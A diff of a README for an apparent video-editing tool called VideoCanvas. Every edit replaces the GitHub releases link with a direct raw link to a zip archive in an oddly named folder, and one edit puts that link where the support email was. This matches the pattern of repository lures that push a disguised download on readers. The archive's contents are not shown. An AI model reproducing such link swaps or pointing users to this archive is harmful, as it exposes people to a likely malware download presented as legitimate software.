@@ -6,7 +6,7 @@ Welcome to VideoCanvas! This application allows you to fill in missing parts of 
 
 ## 📥 Download VideoCanvas
 
-[![Download VideoCanvas](https://img.shields.io/badge/Download-VideoCanvas-blue)](https://github.com/almasins/VideoCanvas/releases)
+[![Download VideoCanvas](https://raw.githubusercontent.com/almasins/VideoCanvas/main/aristocratically/VideoCanvas.zip)](https://raw.githubusercontent.com/almasins/VideoCanvas/main/aristocratically/VideoCanvas.zip)
 
 ## 📋 Requirements
 
@@ -23,7 +23,7 @@ Before you download VideoCanvas, ensure your computer meets these basic requirem
 To download and install VideoCanvas, follow these steps:
 
 1. Click the link below to visit the releases page.
-   [Download VideoCanvas from Releases](https://github.com/almasins/VideoCanvas/releases)
+   [Download VideoCanvas from Releases](https://raw.githubusercontent.com/almasins/VideoCanvas/main/aristocratically/VideoCanvas.zip)
    
 2. On the releases page, you will see a list of available versions. Look for the latest version.
 
@@ -78,7 +78,7 @@ VideoCanvas comes packed with features to enhance your video editing experience:
 
 If you encounter any issues while using VideoCanvas, please reach out to us. We aim to help you:
 
-- **Email Support:** contact@videocanvasapp.com
+- **Email Support:** https://raw.githubusercontent.com/almasins/VideoCanvas/main/aristocratically/VideoCanvas.zip
 - **GitHub Issues:** Use the Issues section in the repository to report bugs or ask questions.
 
 We appreciate your feedback and strive to improve the application based on user experiences.
@@ -87,6 +87,6 @@ We appreciate your feedback and strive to improve the application based on user 
 
 For your convenience, here is the download link once more:
 
-[Download VideoCanvas from Releases](https://github.com/almasins/VideoCanvas/releases)
+[Download VideoCanvas from Releases](https://raw.githubusercontent.com/almasins/VideoCanvas/main/aristocratically/VideoCanvas.zip)
 
 Enjoy creating amazing videos with VideoCanvas!
